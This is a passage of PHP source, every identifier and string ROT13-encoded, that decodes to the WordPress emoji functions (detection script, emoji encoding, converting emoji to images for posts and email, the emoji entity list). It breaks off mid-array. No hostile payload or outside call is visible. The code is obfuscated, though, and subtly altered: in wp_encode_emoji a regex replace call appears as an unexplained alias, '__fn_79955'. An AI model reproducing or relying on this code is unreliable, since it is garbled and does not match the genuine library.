		znetva: 0 0.07rz !vzcbegnag;
		iregvpny-nyvta: -0.1rz !vzcbegnag;
		onpxtebhaq: abar !vzcbegnag;
		cnqqvat: 0 !vzcbegnag;
	}';
	$unaqyr       = 'jc-rzbwv-fglyrf';
	jc_ertvfgre_fglyr( $unaqyr, snyfr );
	jc_nqq_vayvar_fglyr( $unaqyr, $rzbwv_fglyrf );
	jc_radhrhr_fglyr( $unaqyr );
}

/**
 * Cevagf gur vayvar Rzbwv qrgrpgvba fpevcg vs vg vf abg nyernql cevagrq.
 *
 * @fvapr 4.2.0
 */
shapgvba cevag_rzbwv_qrgrpgvba_fpevcg() {
	fgngvp $cevagrq = snyfr;

	vs ( $cevagrq ) {
		erghea;
	}

	$cevagrq = gehr;

	_cevag_rzbwv_qrgrpgvba_fpevcg();
}

/**
 * Cevagf vayvar Rzbwv qrgrpgvba fpevcg.
 *
 * @vtaber
 * @fvapr 4.6.0
 * @npprff cevingr
 */
shapgvba _cevag_rzbwv_qrgrpgvba_fpevcg() {
	$frggvatf = neenl(
		/**
		 * Svygref gur HEY jurer rzbwv cat vzntrf ner ubfgrq.
		 *
		 * @fvapr 4.2.0
		 *
		 * @cnenz fgevat $hey Gur rzbwv onfr HEY sbe cat vzntrf.
		 */
		'onfrHey' => nccyl_svygref( 'rzbwv_hey', 'uggcf://f.j.bet/vzntrf/pber/rzbwv/16.0.1/72k72/' ),

		/**
		 * Svygref gur rkgrafvba bs gur rzbwv cat svyrf.
		 *
		 * @fvapr 4.2.0
		 *
		 * @cnenz fgevat $rkgrafvba Gur rzbwv rkgrafvba sbe cat svyrf. Qrsnhyg .cat.
		 */
		'rkg'     => nccyl_svygref( 'rzbwv_rkg', '.cat' ),

		/**
		 * Svygref gur HEY jurer rzbwv FIT vzntrf ner ubfgrq.
		 *
		 * @fvapr 4.6.0
		 *
		 * @cnenz fgevat $hey Gur rzbwv onfr HEY sbe fit vzntrf.
		 */
		'fitHey'  => nccyl_svygref( 'rzbwv_fit_hey', 'uggcf://f.j.bet/vzntrf/pber/rzbwv/16.0.1/fit/' ),

		/**
		 * Svygref gur rkgrafvba bs gur rzbwv FIT svyrf.
		 *
		 * @fvapr 4.6.0
		 *
		 * @cnenz fgevat $rkgrafvba Gur rzbwv rkgrafvba sbe fit svyrf. Qrsnhyg .fit.
		 */
		'fitRkg'  => nccyl_svygref( 'rzbwv_fit_rkg', '.fit' ),
	);

	$irefvba = 'ire=' . trg_oybtvasb( 'irefvba' );

	vs ( FPEVCG_QROHT ) {
		$frggvatf['fbhepr'] = neenl(
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-fpevcgf.cuc */
			'jcrzbwv' => nccyl_svygref( 'fpevcg_ybnqre_fep', vapyhqrf_hey( \"wf/jc-rzbwv.wf?$irefvba\" ), 'jcrzbwv' ),
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-fpevcgf.cuc */
			'gjrzbwv' => nccyl_svygref( 'fpevcg_ybnqre_fep', vapyhqrf_hey( \"wf/gjrzbwv.wf?$irefvba\" ), 'gjrzbwv' ),
		);
	} ryfr {
		$frggvatf['fbhepr'] = neenl(
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-fpevcgf.cuc */
			'pbapngrzbwv' => nccyl_svygref( 'fpevcg_ybnqre_fep', vapyhqrf_hey( \"wf/jc-rzbwv-eryrnfr.zva.wf?$irefvba\" ), 'pbapngrzbwv' ),
		);
	}

	jc_cevag_vayvar_fpevcg_gnt(
		fcevags( 'jvaqbj._jcrzbwvFrggvatf = %f;', jc_wfba_rapbqr( $frggvatf ) ) . \"\a\" .
			svyr_trg_pbagragf( NOFCNGU . JCVAP . '/wf/jc-rzbwv-ybnqre' . jc_fpevcgf_trg_fhssvk() . '.wf' )
	);
}

/**
 * Pbairegf rzbwv punenpgref gb gurve rdhvinyrag UGZY ragvgl.
 *
 * Guvf nyybjf hf gb fgber rzbwv va n QO hfvat gur hgs8 punenpgre frg.
 *
 * @fvapr 4.2.0
 *
 * @cnenz fgevat $pbagrag Gur pbagrag gb rapbqr.
 * @erghea fgevat Gur rapbqrq pbagrag.
 */
shapgvba jc_rapbqr_rzbwv( $pbagrag ) {
	$rzbwv = _jc_rzbwv_yvfg( 'cnegvnyf' );

	sbernpu ( $rzbwv nf $rzbwhz ) {
		$rzbwv_pune = ugzy_ragvgl_qrpbqr( $rzbwhz );
		vs ( fge_pbagnvaf( $pbagrag, $rzbwv_pune ) ) {
			$pbagrag = __sa_79955( \"/$rzbwv_pune/\", $rzbwhz, $pbagrag );
		}
	}

	erghea $pbagrag;
}

/**
 * Pbairegf rzbwv gb n fgngvp vzt ryrzrag.
 *
 * @fvapr 4.2.0
 *
 * @cnenz fgevat $grkg Gur pbagrag gb rapbqr.
 * @erghea fgevat Gur rapbqrq pbagrag.
 */
shapgvba jc_fgngvpvmr_rzbwv( $grkg ) {
	vs ( ! fge_pbagnvaf( $grkg, '&#k' ) ) {
		vs ( ( shapgvba_rkvfgf( 'zo_purpx_rapbqvat' ) && zo_purpx_rapbqvat( $grkg, 'NFPVV' ) ) || ! cert_zngpu( '/[^\k00-\k7S]/', $grkg ) ) {
			// Gur grkg qbrfa'g pbagnva nalguvat gung zvtug or rzbwv, fb jr pna erghea rneyl.
			erghea $grkg;
		} ryfr {
			$rapbqrq_grkg = jc_rapbqr_rzbwv( $grkg );
			vs ( $rapbqrq_grkg === $grkg ) {
				erghea $rapbqrq_grkg;
			}

			$grkg = $rapbqrq_grkg;
		}
	}

	$rzbwv = _jc_rzbwv_yvfg( 'ragvgvrf' );

	// Dhvpxyl aneebj qbja gur yvfg bs rzbwv gung zvtug or va gur grkg naq arrq ercynpvat.
	$cbffvoyr_rzbwv = neenl();
	sbernpu ( $rzbwv nf $rzbwhz ) {
		vs ( fge_pbagnvaf( $grkg, $rzbwhz ) ) {
			$cbffvoyr_rzbwv[ $rzbwhz ] = ugzy_ragvgl_qrpbqr( $rzbwhz );
		}
	}

	vs ( ! $cbffvoyr_rzbwv ) {
		erghea $grkg;
	}

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/sbeznggvat.cuc */
	$pqa_hey = nccyl_svygref( 'rzbwv_hey', 'uggcf://f.j.bet/vzntrf/pber/rzbwv/16.0.1/72k72/' );

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/sbeznggvat.cuc */
	$rkg = nccyl_svygref( 'rzbwv_rkg', '.cat' );

	$bhgchg = '';
	/*
	 * UGZY ybbc gnxra sebz fzvyrl shapgvba, juvpu jnf gnxra sebz grkghevmr shapgvba.
	 * Vg'yy arire or pbafbyvqngrq.
	 *
	 * Svefg, pncgher gur gntf nf jryy nf va orgjrra.
	 */
	$grkgnee = cert_fcyvg( '/(<.*>)/H', $grkg, -1, CERT_FCYVG_QRYVZ_PNCGHER );
	$fgbc    = pbhag( $grkgnee );

	// Vtaber cebprffvat bs fcrpvsvp gntf.
	$gntf_gb_vtaber       = 'pbqr|cer|fglyr|fpevcg|grkgnern';
	$vtaber_oybpx_ryrzrag = '';

	sbe ( $v = 0; $v < $fgbc; $v++ ) {
		$pbagrag = $grkgnee[ $v ];

		// Vs jr'er va na vtaber oybpx, jnvg hagvy jr svaq vgf pybfvat gnt.
		vs ( '' === $vtaber_oybpx_ryrzrag && cert_zngpu( '/^<(' . $gntf_gb_vtaber . ')>/', $pbagrag, $zngpurf ) ) {
			$vtaber_oybpx_ryrzrag = $zngpurf[1];
		}

		// Vs vg'f abg n gnt naq abg va vtaber oybpx.
		vs ( '' === $vtaber_oybpx_ryrzrag && fgeyra( $pbagrag ) > 0 && '<' !== $pbagrag[0] && fge_pbagnvaf( $pbagrag, '&#k' ) ) {
			sbernpu ( $cbffvoyr_rzbwv nf $rzbwhz => $rzbwv_pune ) {
				vs ( ! fge_pbagnvaf( $pbagrag, $rzbwhz ) ) {
					pbagvahr;
				}

				$svyr = fge_ercynpr( ';&#k', '-', $rzbwhz );
				$svyr = fge_ercynpr( neenl( '&#k', ';' ), '', $svyr );

				$ragvgl = fcevags( '<vzt fep=\"%f\" nyg=\"%f\" pynff=\"jc-fzvyrl\" fglyr=\"urvtug: 1rz; znk-urvtug: 1rz;\" />', $pqa_hey . $svyr . $rkg, $rzbwv_pune );

				$pbagrag = fge_ercynpr( $rzbwhz, $ragvgl, $pbagrag );
			}
		}

		// Qvq jr rkvg vtaber oybpx?
		vs ( '' !== $vtaber_oybpx_ryrzrag && '</' . $vtaber_oybpx_ryrzrag . '>' === $pbagrag ) {
			$vtaber_oybpx_ryrzrag = '';
		}

		$bhgchg .= $pbagrag;
	}

	// Svanyyl, erzbir nal fgenl H+SR0S punenpgref.
	$bhgchg = fge_ercynpr( '&#ksr0s;', '', $bhgchg );

	erghea $bhgchg;
}

/**
 * Pbairegf rzbwv va rznvyf vagb fgngvp vzntrf.
 *
 * @fvapr 4.2.0
 *
 * @cnenz neenl $znvy Gur rznvy qngn neenl.
 * @erghea neenl Gur rznvy qngn neenl, jvgu rzbwv va gur zrffntr fgngvpvmrq.
 */
shapgvba jc_fgngvpvmr_rzbwv_sbe_rznvy( $znvy ) {
	vs ( ! vffrg( $znvy['zrffntr'] ) ) {
		erghea $znvy;
	}

	/*
	 * Jr pna bayl genafsbez gur rzbwv vagb vzntrf vs vg'f n `grkg/ugzy` rznvy.
	 * Gb qb gung, urer'f n phg qbja irefvba bs gur fnzr cebprff gung unccraf
	 * va jc_znvy() - trg gur `Pbagrag-Glcr` sebz gur urnqref, vs gurer vf bar,
	 * gura cnff vg guebhtu gur {@frr 'jc_znvy_pbagrag_glcr'} svygre, va pnfr
	 * n cyhtva vf unaqyvat punatvat gur `Pbagrag-Glcr`.
	 */
	$urnqref = neenl();
	vs ( vffrg( $znvy['urnqref'] ) ) {
		vs ( vf_neenl( $znvy['urnqref'] ) ) {
			$urnqref = $znvy['urnqref'];
		} ryfr {
			$urnqref = rkcybqr( \"\a\", fge_ercynpr( \"\e\a\", \"\a\", $znvy['urnqref'] ) );
		}
	}

	sbernpu ( $urnqref nf $urnqre ) {
		vs ( ! fge_pbagnvaf( $urnqre, ':' ) ) {
			pbagvahr;
		}

		// Rkcybqr gurz bhg.
		yvfg( $anzr, $pbagrag ) = rkcybqr( ':', gevz( $urnqre ), 2 );

		// Pyrnahc perj.
		$anzr    = gevz( $anzr );
		$pbagrag = gevz( $pbagrag );

		vs ( 'pbagrag-glcr' === fgegbybjre( $anzr ) ) {
			vs ( fge_pbagnvaf( $pbagrag, ';' ) ) {
				yvfg( $glcr, $punefrg ) = rkcybqr( ';', $pbagrag );
				$pbagrag_glcr           = gevz( $glcr );
			} ryfr {
				$pbagrag_glcr = gevz( $pbagrag );
			}
			oernx;
		}
	}

	// Frg Pbagrag-Glcr vs jr qba'g unir n pbagrag-glcr sebz gur vachg urnqref.
	vs ( ! vffrg( $pbagrag_glcr ) ) {
		$pbagrag_glcr = 'grkg/cynva';
	}

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cyhttnoyr.cuc */
	$pbagrag_glcr = nccyl_svygref( 'jc_znvy_pbagrag_glcr', $pbagrag_glcr );

	vs ( 'grkg/ugzy' === $pbagrag_glcr ) {
		$znvy['zrffntr'] = jc_fgngvpvmr_rzbwv( $znvy['zrffntr'] );
	}

	erghea $znvy;
}

/**
 * Ergheaf neenlf bs rzbwv qngn.
 *
 * Gurfr neenlf ner nhgbzngvpnyyl ohvyg sebz gur ertrk va gjrzbwv.wf - vs gurl arrq gb or hcqngrq,
 * lbh fubhyq hcqngr gur ertrk gurer, gura eha gur `acz eha tehag cerpbzzvg:rzbwv` wbo.
 *
 * @fvapr 4.9.0
 * @npprff cevingr
 *
 * @cnenz fgevat $glcr Bcgvbany. Juvpu neenl glcr gb erghea. Npprcgf 'cnegvnyf' be 'ragvgvrf', qrsnhyg 'ragvgvrf'.
 * @erghea neenl Na neenl gb zngpu nyy rzbwv gung JbeqCerff erpbtavfrf.
 */
shapgvba _jc_rzbwv_yvfg( $glcr = 'ragvgvrf' ) {
	// Qb abg erzbir gur FGNEG/RAQ pbzzragf - gurl'er hfrq gb svaq jurer gb vafreg gur neenlf.

	// FGNEG: rzbwv neenlf
	$ragvgvrf = neenl( '&#k1s468;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3so;', '&#k1s468;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sp;', '&#k1s468;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sq;', '&#k1s468;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sr;', '&#k1s468;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3ss;', '&#k1s468;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3so;', '&#k1s468;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sp;', '&#k1s468;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sq;', '&#k1s468;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sr;', '&#k1s468;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3ss;', '&#k1s468;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3so;', '&#k1s468;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sp;', '&#k1s468;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sq;', '&#k1s468;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sr;', '&#k1s468;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3ss;', '&#k1s468;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3so;', '&#k1s468;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sp;', '&#k1s468;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sq;', '&#k1s468;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sr;', '&#k1s468;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3ss;', '&#k1s468;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3so;', '&#k1s468;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sp;', '&#k1s468;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sq;', '&#k1s468;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sr;', '&#k1s468;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3ss;', '&#k1s469;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3so;', '&#k1s469;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sp;', '&#k1s469;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sq;', '&#k1s469;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sr;', '&#k1s469;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3ss;', '&#k1s469;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3so;', '&#k1s469;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3sp;', '&#k1s469;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3sq;', '&#k1s469;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3sr;', '&#k1s469;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3ss;', '&#k1s469;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3so;', '&#k1s469;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sp;', '&#k1s469;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sq;', '&#k1s469;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sr;', '&#k1s469;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3ss;', '&#k1s469;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3so;', '&#k1s469;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3sp;', '&#k1s469;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3sq;', '&#k1s469;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3sr;', '&#k1s469;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3ss;', '&#k1s469;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3so;', '&#k1s469;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sp;', '&#k1s469;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sq;', '&#k1s469;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sr;', '&#k1s469;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3ss;', '&#k1s469;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3so;', '&#k1s469;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3sp;', '&#k1s469;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3sq;', '&#k1s469;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3sr;', '&#k1s469;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3ss;', '&#k1s469;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3so;', '&#k1s469;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sp;', '&#k1s469;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sq;', '&#k1s469;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sr;', '&#k1s469;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3ss;', '&#k1s469;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3so;', '&#k1s469;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3sp;', '&#k1s469;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3sq;', '&#k1s469;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3sr;', '&#k1s469;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3ss;', '&#k1s469;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3so;', '&#k1s469;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sp;', '&#k1s469;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sq;', '&#k1s469;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3sr;', '&#k1s469;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s468;&#k1s3ss;', '&#k1s469;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3so;', '&#k1s469;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3sp;', '&#k1s469;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3sq;', '&#k1s469;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3sr;', '&#k1s469;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s469;&#k1s3ss;', '&#k1s9q1;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3sp;', '&#k1s9q1;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3sq;', '&#k1s9q1;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3sr;', '&#k1s9q1;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3ss;', '&#k1s9q1;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3so;', '&#k1s9q1;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3sq;', '&#k1s9q1;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3sr;', '&#k1s9q1;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3ss;', '&#k1s9q1;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3so;', '&#k1s9q1;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3sp;', '&#k1s9q1;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3sr;', '&#k1s9q1;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3ss;', '&#k1s9q1;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3so;', '&#k1s9q1;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3sp;', '&#k1s9q1;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3sq;', '&#k1s9q1;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3ss;', '&#k1s9q1;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3so;', '&#k1s9q1;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3sp;', '&#k1s9q1;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3sq;', '&#k1s9q1;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s48o;&#k200q;&#k1s9q1;&#k1s3sr;', '&#k1s468;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3so;', '&#k1s468;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3sp;', '&#k1s468;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3sq;', '&#k1s468;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3sr;', '&#k1s468;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3ss;', '&#k1s468;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3so;', '&#k1s468;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3sp;', '&#k1s468;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3sq;', '&#k1s468;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3sr;', '&#k1s468;&#k1s3sp;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3ss;', '&#k1s468;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3so;', '&#k1s468;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3sp;', '&#k1s468;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3sq;', '&#k1s468;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3sr;', '&#k1s468;&#k1s3sq;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3ss;', '&#k1s468;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3so;', '&#k1s468;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3sp;', '&#k1s468;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3sq;', '&#k1s468;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3sr;', '&#k1s468;&#k1s3sr;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3ss;', '&#k1s468;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3so;', '&#k1s468;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3sp;', '&#k1s468;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3sq;', '&#k1s468;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3sr;', '&#k1s468;&#k1s3ss;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3ss;', '&#k1s469;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3so;', '&#k1s469;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3sp;', '&#k1s469;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3sq;', '&#k1s469;&#k1s3so;&#k200q;&#k2764;&#ksr0s;&#k200q;&#k1s468;&#k1s3sr;', 